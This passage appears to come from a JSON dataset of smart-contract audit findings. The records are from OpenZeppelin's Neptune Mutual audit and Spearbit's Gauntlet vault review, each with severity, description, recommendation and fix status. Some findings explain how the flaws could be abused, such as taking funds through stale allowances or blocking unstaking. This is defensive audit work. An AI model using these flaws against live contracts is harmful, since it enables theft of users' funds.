      "content": "A staking pool can be [closed](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/pool/Staking/StakingPoolBase.sol#L51-L59) without checking if there is any remaining liquidity of either the staking token or the reward token. Once the pool is closed, neither [`deposit`](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/pool/Staking/StakingPools.sol#L20-L23) nor [`withdraw`](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/pool/Staking/StakingPools.sol#L39-L41) functions are allowed. Hence, users won’t be able to access their funds. However a recovery agent is still able to [retrieve](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/Recoverable.sol#L49) both staking and reward tokens and distribute them as desired.\n\n\nConsider checking for remaining liquidity before closing a pool.\n\n\n**Update:** *Fixed as of commit `86b0caa0995ffcdbb1deecf8547c9a3db8c23821` in [pull request #160](https://github.com/neptune-mutual-blue/protocol/pull/160).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10499",
      "title": "Unexpected deployer privileges",
      "impact": "MEDIUM",
      "content": "The deployer address of the `Store` contract is [recorded as a protocol member](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/store/StoreBase.sol#L30), which allows it to update the storage arbitrarily. The same address [is set](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.4/contracts/access/Ownable.sol#L29) as the contract’s `owner` role, which allows it to [pause and unpause](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/store/StoreBase.sol#L65-L83) storage updates. We believe these are intended to be the same role, but they are not programmatically connected. In particular, if the owner address is [renounced or transferred](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.4/contracts/access/Ownable.sol#L47-L65), the deployer will still be able to update storage.\n\n\nMoreover, it is unclear why the `Store` owner or deployer requires the ability to modify storage arbitrarily.\n\n\nConsider documenting the role in the [Security overview](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/security.md) if the role is required. Otherwise, consider renouncing protocol member privileges from the deployer address after the deployment is finished.\n\n\n**Update:** *Fixed as of commit `0b278019c01dbce22923d0bb6968ddb48bcc3e2d` in [pull request #123](https://github.com/neptune-mutual-blue/protocol/pull/123). The deployer address is removed as a protocol member, assuming the deployer is the address that calls the `initialize` function.*",
      "summary": "\nThis bug report is about the `Store` contract in the Neptune Mutual Blue Protocol. The `Store` contract has two roles - deployer and owner - which are not programmatically connected. This means that if the owner address is changed, the deployer will still be able to update storage. Furthermore, it is unclear why the `Store` owner or deployer requires the ability to modify storage arbitrarily.\n\nThe bug was fixed in commit `0b278019c01dbce22923d0bb6968ddb48bcc3e2d` in pull request #123. The deployer address was removed as a protocol member, assuming the deployer is the address that calls the `initialize` function. To ensure the security of the protocol, the role should be documented in the Security overview if required. Otherwise, the deployer address should be renounced after the deployment is finished.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10498",
      "title": "Unable to unstake after finalization",
      "impact": "MEDIUM",
      "content": "Reporters on the winning camp can [unstake their tokens](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/governance/resolution/Unstakable.sol#L42-L46) even after the incident has been [finalized](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/governance/resolution/Resolvable.sol#L130-L131), albeit with no reward. However, the [resolution deadline](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/governance/resolution/Resolvable.sol#L142) is not specific to a particular incident and is [reset to 0](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/governance/resolution/Finalization.sol#L92) during finalization. Since the [deadline is checked](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/ValidationLibV1.sol#L400) during unstaking, the operation will fail. This means that some successful NPM stakers will be unable to retrieve their funds.\n\n\nIn this scenario, a recovery agent could still [retrieve](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/Recoverable.sol#L49) the funds from the `Resolution` contract and distribute them as desired.\n\n\nConsider recording the resolution deadline with the incident date so it does not need to be cleared during finalization.\n\n\n**Update:** *Fixed as of commit `6cb6b6064eca18cccee8114cbcefd2455c286ce9` in [pull request #132](https://github.com/neptune-mutual-blue/protocol/pull/132) and commit `4b929c274100a981107e35d40fbf5b57fabc9be4` in [pull request #196](https://github.com/neptune-mutual-blue/protocol/pull/196).*",
      "summary": "\nThis bug report is about a system that allows users to stake tokens and win rewards. The issue is that when the incident has been finalized, the resolution deadline is reset to 0, which means that some successful stakers will be unable to retrieve their funds. A recovery agent could still retrieve the funds from the Resolution contract, but it would be better to record the resolution deadline with the incident date so it does not need to be cleared during finalization. This issue has since been fixed with commits 6cb6b6064eca18cccee8114cbcefd2455c286ce9 in pull request #132 and 4b929c274100a981107e35d40fbf5b57fabc9be4 in pull request #196.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10497",
      "title": "Parallel access control",
      "impact": "MEDIUM",
      "content": "The `Protocol` contract inherits the OpenZeppelin `AccessControl` contract, and uses it to define [the role hierarchy](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/ProtoBase.sol#L18). It also provides a mechanism for the administrator to [grant an existing role](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/Protocol.sol#L283) to a new address. However, this mechanism functions in parallel to the [inherited mechanism](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.4/contracts/access/AccessControl.sol#L130) for granting roles. This leads to two inconsistencies:\n\n\n* A role administrator can bypass the `whenNotPaused` restriction by using the inherited mechanism.\n* The `NS_ROLES_ADMIN` can use the new mechanism to grant the `NS_ROLES_GOVERNANCE_AGENT`, even though they [do not directly administer](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/ProtoBase.sol#L23) that role.\n\n\nConsider ensuring consistency between the two mechanisms. Depending on the desired outcome, this could involve relying on the original mechanism, changing the role relationships, or overriding the inherited `grantRole` function.\n\n\n**Update:** *Fixed as of commit `1d54d66493e3109c12d610f0231529cbd65b5ba9` in [pull request #157](https://github.com/neptune-mutual-blue/protocol/pull/157) and commit `4b929c274100a981107e35d40fbf5b57fabc9be4` in [pull request #196](https://github.com/neptune-mutual-blue/protocol/pull/196).*",
      "summary": "\nThe Protocol contract is an inherited OpenZeppelin AccessControl contract, which defines the role hierarchy and provides a mechanism for the administrator to grant an existing role to a new address. However, this mechanism functions in parallel to the inherited mechanism for granting roles, leading to two inconsistencies. Firstly, a role administrator can bypass the whenNotPaused restriction by using the inherited mechanism. Secondly, the NS_ROLES_ADMIN can use the new mechanism to grant the NS_ROLES_GOVERNANCE_AGENT, even though they do not directly administer that role. \n\nTo fix this, the developers considered ensuring consistency between the two mechanisms. Depending on the desired outcome, this could involve relying on the original mechanism, changing the role relationships, or overriding the inherited grantRole function. After the necessary changes were made, the bug was fixed as of two commits in pull requests #157 and #196.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10496",
      "title": "Incorrect policy fee",
      "impact": "MEDIUM",
      "content": "There are two discrepancies when calculating a policy fee rate:\n\n\n* It is always [strictly higher](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/PolicyHelperV1.sol#L55-L57) than the configured floor.\n* The [amount of days charged](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/PolicyHelperV1.sol#L64) does not account for a non-standard [coverage lag period](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/PolicyHelperV1.sol#L259).\n\n\nConsider updating the calculation accordingly.\n\n\n**Update:** *Fixed as of commit `84a6fc3167adfb61b6f16666f0ba422b60bc0b2c` in [pull request #159](https://github.com/neptune-mutual-blue/protocol/pull/159) and commit `4b929c274100a981107e35d40fbf5b57fabc9be4` in [pull request #196](https://github.com/neptune-mutual-blue/protocol/pull/196). The Neptune team have chosen not to address the first bullet.*",
      "summary": "\nA bug report has been filed regarding discrepancies when calculating a policy fee rate. Specifically, the calculated rate is always higher than the configured floor, and the amount of days charged does not account for a non-standard coverage lag period. The Neptune team have chosen to address the second issue, and have fixed it in two commits, `84a6fc3167adfb61b6f16666f0ba422b60bc0b2c` in pull request #159 and `4b929c274100a981107e35d40fbf5b57fabc9be4` in pull request #196. The first issue has not been addressed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10495",
      "title": "Potential token transfer from unrelated account",
      "impact": "MEDIUM",
      "content": "The `CoverReassurance` contract [contains a mechanism](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/lifecycle/CoverReassurance.sol#L66) to retrieve funds from an arbitrary account, as long as the account has provided a non-zero allowance. This would occur whenever a cover owner can front-run another cover owner’s reassurance transaction, allowing them to redirect the funds to their own cover.\n\n\nEven without front-running, there are multiple reasons an account may have a non-zero allowance, including:\n\n\n* Their `addReassurance` transaction failed and they didn’t revoke the allowance.\n* They made an unlimited approval.\n* They approved a higher allowance than the amount they eventually transferred.\n\n\nIn all cases, an attacker can retrieve those funds and direct them towards a cover.\n\n\nA recovery agent could still [retrieve](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/Recoverable.sol#L49) the funds from the `CoverReassurance` contract and distribute them as desired, although it is unclear how they would distinguish a front-running attack from one where a cover owner legitimately transfers funds from a different account.\n\n\nConsider retrieving the tokens from the message sender rather than an arbitrary [`account` parameter](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/lifecycle/CoverReassurance.sol#L53).\n\n\n**Update:** *Fixed as of commit `ca55b69c5cdd80bcccdc83dd5d569933f450fa6a` in [pull request #139](https://github.com/neptune-mutual-blue/protocol/pull/139).*",
      "summary": "\nThis bug report is about a vulnerability in the `CoverReassurance` contract that allows attackers to retrieve funds from an arbitrary account. This can occur if the account has a non-zero allowance, such as if their `addReassurance` transaction failed, they made an unlimited approval, or they approved a higher allowance than what they eventually transferred. The recovery agent could still retrieve the funds, but it is unclear how they could distinguish a front-running attack from a legitimate transfer.\n\nA solution was proposed to retrieve the tokens from the message sender rather than an arbitrary `account` parameter. This was fixed as of commit `ca55b69c5cdd80bcccdc83dd5d569933f450fa6a` in pull request #139.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10494",
      "title": "Unenforced staking requirement",
      "impact": "MEDIUM",
      "content": "Adding liquidity requires a liquidity provider to have at least [a minimum amount of NPM tokens](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/VaultLibV1.sol#L151) staked in the vault.\n\n\nHowever, the purpose and usefulness of this requirement is unclear, since it can be bypassed. In particular:\n\n\n* there is no relationship between the amount of PODs created and the size of the stake\n* PODs are transferable to unstaked users, so users can provide liquidity without staking\n* staked users can [exit their entire staked `amount`](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/liquidity/VaultLiquidity.sol#L113-L118) without redeeming any PODs by calling `removeLiquidity` with parameters `podsToRedeem = 0`, `npmStakeToRemove = amount`, and `exit = 1`; the `exit = 1` is crucial as it allows execution of [line 234](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/VaultLibV1.sol#L234) of `VaultLibV1.sol`\n\n\nConsider documenting and enforcing the intended relationship between NPM staking and liquidity provision.\n\n\n**Update:** *Acknowledged, not fixed. The Neptune team stated:*\n\n\n\n> *Although we plan to redo the staking requirement logic from scratch, we wish to consider this risk as acceptable for the time being.*\n> \n>",
      "summary": "\nThis bug report is about the relationship between NPM staking and liquidity provision in the Neptune Mutual protocol. It states that a liquidity provider is required to have a minimum amount of NPM tokens staked in the vault. However, it can be bypassed, as there is no relationship between the amount of PODs created and the size of the stake. Furthermore, PODs are transferable to unstaked users, which allows users to provide liquidity without staking. Lastly, staked users can exit their entire staked amount without redeeming any PODs. The Neptune team has acknowledged the risk but they plan to redo the staking requirement logic from scratch in the future.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10493",
      "title": "Risk of insufficient liquidity",
      "impact": "HIGH",
      "content": "When purchasing a cover, the protocol [ensures it has enough funds](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/PolicyHelperV1.sol#L50) to pay out all potential claimants. The computation of the [existing commitments](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/CoverUtilV1.sol#L477-L481) includes all covers expiring in the next 3 months, since this is the [maximum policy duration](https://github.com/neptune-mutual-blue/protocol/blob/133bc8a4157d4f27471b0cf43ac0ce2b51bb5e5a/contracts/libraries/ProtoUtilV1.sol#L14). However, some covers may expire [in the fourth month](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/CoverUtilV1.sol#L609) and these would be excluded from the calculation. Therefore, the protocol could sell more insurance than it can support, and some valid claimants may be unable to retrieve their payment.\n\n\nConsider including the extra month in the commitment computation.\n\n\n**Update:** *Fixed as of commit `63fce22c67f72cf090ffa124784a3d92935e2d66` in [pull request #136](https://github.com/neptune-mutual-blue/protocol/pull/136).*",
      "summary": "\nA bug was identified in the Neptune Mutual Protocol, which is responsible for ensuring that enough funds are available when a cover is purchased. The protocol was counting the existing commitments, but only included covers expiring in the next three months, as this is the maximum policy duration. However, some covers may expire in the fourth month and these would be excluded from the calculation. This could lead to the protocol selling more insurance than it can support, and some valid claimants may be unable to retrieve their payment.\n\nTo address this, it was suggested to include the extra month in the commitment computation. This bug has now been fixed and the fix can be found in commit `63fce22c67f72cf090ffa124784a3d92935e2d66` in pull request #136.",
      "quality_score": 2,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10492",
      "title": "Conflated staking pool reward balances",
      "impact": "HIGH",
      "content": "Each staking pool specifies its own reward token and [corresponding balance](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/StakingPoolCoreLibV1.sol#L210-L214) in the same aggregate contract. When retrieving this value, the [token balance of the aggregate contract](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/StakingPoolLibV1.sol#L158) is returned. Since there could be multiple staking pools with the same reward token, this could include balances from other pools. It could also include any reward token balances that were directly sent to the contract.\n\n\nMoreover, current user rewards [could also be overstated](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/StakingPoolLibV1.sol#L178), which would [prevent users from claiming the last rewards](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/StakingPoolLibV1.sol#L212). Since [rewards are claimed](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/StakingPoolLibV1.sol#L298) when withdrawing stake, anyone could prevent users from unstaking by directly sending reward tokens to the staking pool contract. Any non-zero amount would be sufficient to trigger this scenario. If this occurs, a recovery agent could still [retrieve](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/Recoverable.sol#L49) the funds from the aggregate pool contract and distribute them as desired, although it is not clear how they should distribute the remaining rewards.\n\n\nConsider reading the pool balance from the saved record.\n\n\n**Update:** *Fixed as of commit `8b660b13cf9fbcde0bfedb3819dbb670ba74b09a` in [pull request #156](https://github.com/neptune-mutual-blue/protocol/pull/156).*",
      "summary": "\nA bug was discovered in the Neptune Mutual protocol that affects the way staking pools handle rewards. Each staking pool specifies its own reward token and corresponding balance in the same aggregate contract. However, when retrieving this value, the token balance of the aggregate contract is returned, which could include balances from other pools or any reward token balances that were directly sent to the contract. This could lead to user rewards being overstated, preventing them from claiming the last rewards. In addition, if a malicious actor sent a non-zero amount of reward tokens to the staking pool contract, it would further prevent users from unstaking. In order to fix this issue, the pool balance was read from the saved record in commit 8b660b13cf9fbcde0bfedb3819dbb670ba74b09a in pull request #156.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "7111",
      "title": "Implement zero-address check for manager_",
      "impact": "LOW",
      "content": "## Low Risk Report\n\n**Severity:** Low Risk  \n**Context:** AeraVaultV1.sol#L267  \n\n**Description:**  \nNon-existent zero-address checks inside the constructor for the `manager_` parameter. If `manager_` becomes a zero address, then calls to `calculateAndDistributeManagerFees` will burn tokens (transfer them to `address(0)`).\n\n**Recommendation:**  \nImplement a zero-address check for `manager_` user input.\n\n**Example:**\n```solidity\nrequire(manager_ != address(0), \"manager_: zero address\");\n```\n\n**Gauntlet:**  \nFix implemented in PR #101.  \n\n**Spearbit:**  \nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7110",
      "title": "Adopt the two-step ownership transfer pattern",
      "impact": "LOW",
      "content": "## Security Findings\n\n## Severity\nLow Risk\n\n## Context\n- AeraVaultV1.sol#L762-L764\n- Ownable.sol#L61-L64\n\n## Description\nTo prevent the Aera vault Owner, i.e., the Treasury, from calling `renounceOwnership()` and effectively breaking vault critical functions such as `withdraw()` and `finalize()`, the `renounceOwnership()` function is explicitly overridden to revert the transaction every time. However, the `transferOwnership()` function may also lead to the same issue if the ownership is transferred to an uncontrollable address because of human errors or attacks on the Treasury.\n\n## Recommendation\nAdopt the two-step ownership transfer pattern:\n1. The owner sets the new owner\n2. The new owner accepts the ownership\n\n## Gauntlet\nSolved in PR #132.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7109",
      "title": "Use ManagedPoolFactory instead of BaseManagedPoolFactory to deploy the Balancer pool",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- AeraVaultV1.sol#L305-L321\n- AeraVaultV1Fork.ts#L219-L223\n\n## Description\nCurrently, the Aera Vault is using `BaseManagedPoolFactory` as the factory to deploy the Balancer pool, while Balancer’s documentation recommends and encourages the usage of `ManagedPoolFactory`.\n\nQuoting the documentation inside the `BaseManagedPoolFactory`:\n\n> This is a base factory designed to be called from other factories to deploy a ManagedPool with a particular controller/owner. It should NOT be used directly to deploy ManagedPools without controllers. ManagedPools controlled by EOAs would be very dangerous for LPs. There are no restrictions on what the managers can do, so a malicious manager could easily manipulate prices and drain the pool. In this design, other controller-specific factories will deploy a pool controller, then call this factory to deploy the pool, passing in the controller as the owner.\n\n## Recommendation\nUse `ManagedPoolFactory` instead of `BaseManagedPoolFactory` to deploy the Balancer pool following Balancer’s best practices.\n\n## Gauntlet\nSolved in PR #141.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7108",
      "title": "Potential division by 0",
      "impact": "LOW",
      "content": "## Low Risk Issue Report\n\n## Severity\n**Low Risk**\n\n## Context\n- AeraVaultV1.sol#L402-L514\n- AeraVaultV1.sol#L728-L749\n\n## Description\nIf the balance (e.g. `holdings[]`) of a token is `0` in `deposit()`, then the division by `holdings[]` would cause a revert.\n\n**Note:** The function `withdraw()` has similar code, but when `holdings[] == 0`, it is not possible to withdraw anyway. \n\n**Additional Notes:**\n- The current Mannon vault code will not allow the balances to be `0`.\n- Although not used in the current code, in order to do `deregisterTokens()`, Balancer requires the balance to be `0`. Additionally, refer to the following Balancer documentation about `the-vault#deregistertokens`.\n\n### Worst Case Scenario\nThe worst case scenario is that `deposit()` does not work.\n\n```solidity\nfunction deposit(uint256[] calldata amounts) {\n    ...\n    for (uint256 i = 0; i < amounts.length; i++) {\n        if (amounts[i] > 0) {\n            depositToken(tokens[i], amounts[i]);\n            uint256 newBalance = holdings[i] + amounts[i];\n            newWeights[i] = (weights[i] * newBalance) / holdings[i]; // would revert if holdings[i] == 0\n        }\n    }\n    ...\n}\n```\n\nSimilar divisions by `0` could occur in `getWeightChangeRatio()`. The function is called from `updateWeightsGradually()`. If this is due to `targetWeight` being `0`, then it is the desired result. The current weight should not be `0` due to Balancer checks.\n\n```solidity\nfunction getWeightChangeRatio(uint256 weight, uint256 targetWeight) {\n    return \n        weight > targetWeight\n            ? (ONE * weight) / targetWeight // could revert if targetWeight == 0\n            : (ONE * targetWeight) / weight; // could revert if weight == 0\n}\n```\n\n## Recommendation\nDetermine what should happen in the unlikely event that balances become `0` in `deposit()` and adapt the code if necessary. If it is relevant to return readable revert/error messages, then the division by `0` situation could be intercepted and trigger a direct revert.\n\n## Gauntlet\nThe code should revert with `0` balances since having `0` at either side of the AMM pool breaks spot prices and the ability to offer trades. Balancer does not allow `0 weight`, so this would be okay.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7107",
      "title": "Missing nonReentrant modifier on initiateFinalization() ,setManager() and claimManagerFees() functions",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n**Context:**  \nAeraVaultV1.sol#L517, AeraVaultV1.sol#L545, AeraVaultV1.sol#L682\n\n**Description:**  \nThe `initiateFinalization()` function is missing a `nonReentrant` modifier while `calculateAnd-DistributeManagerFees()` executes external calls. Same goes for `setManager()` and `claimManagerFees()` functions.\n\n**Recommendation:**  \nConsider adding the `nonReentrant` modifier to functions that perform external calls.\n\n**Gauntlet:**  \nSolved in PR #112.\n\n**Spearbit:**  \nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7106",
      "title": "Possible rounding down of fees",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nAeraVaultV1.sol#L794-L822\n\n## Description\nIf certain tokens have a few decimal places, then fees could be rounded down to 0, especially if the time between `calculateAndDistributeManagerFees()` calls is relatively small. This could slightly shift the spot price because the balance of one coin is lowered while the other remains constant. With fewer decimals, the situation worsens; for example, Gemini USD (GUSD) has 2 decimal places, which creates a problem with a balance of 10,000 GUSD.\n\n**Note:** The rounding down is probably negligible in most cases.\n\n### Code Snippet\n```solidity\nfunction calculateAndDistributeManagerFees() internal {\n    ...\n    for (uint256 i = 0; i < tokens.length; i++) {\n        amounts[i] = (holdings[i] * managerFeeIndex) / ONE; // could be rounded down to 0\n    }\n    ...\n}\n```\n\nWith 1 USDC in the vault and 2 hours between `calculateAndDistributeManagerFees()`, the fee for USDC is rounded down to 0. This behavior is demonstrated in the following proof of concept:\n\n```solidity\nimport \"hardhat/console.sol\";\n\ncontract testcontract {\n    uint256 constant ONE = 10**18;\n    uint managementFee = 10**8; // MAX_MANAGEMENT_FEE = 10**9;\n\n    constructor() {\n        uint holdings = 1E6; // 1 USDC\n        uint delay = 2 hours;\n        uint managerFeeIndex = delay * managementFee;\n        uint amounts = (holdings * managerFeeIndex) / ONE;\n        console.log(\"Fee\", amounts); // fee is 0\n    }\n}\n```\n\n## Recommendation\nConsider implementing one (or more) of the following suggestions:\n\n1. Sum all the fees and only claim and transfer them at the initiative of the manager. This addresses other issues, such as a malicious manager resulting in inaccessible funds in the vault.\n2. Accept the rounding issue and document it. Verify that the impact on the pool price and management fees is indeed negligible. Managers could also be reimbursed manually if necessary.\n3. If the potential change in the pool price cannot be ignored, update the weights like `withdraw()` is doing.\n4. Round the manager fees up, perhaps only when they are 0. Be aware of the potential for repeatedly calling `claimManagerFees()`, which could result in additional fees, although this is likely less than the gas costs.\n5. Don’t list tokens with a low number of decimals.\n\n## Gauntlet\nWe prefer options 1 and 5. With option 1, we would need to adjust the sweep function to disallow claiming vault tokens.\n\n## Spearbit\nWe would need to adjust the sweep function to disallow claiming vault tokens. We suggest only claiming the tokens from the vault when the manager claims them to minimize claims, thus preventing rounding issues. This way, you won’t have to change the sweep function.\n\n## Gauntlet Response\nMakes sense. FYI - if you claim too early, then you lose a little bit of value.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7105",
      "title": "OpenZeppelin best practices",
      "impact": "LOW",
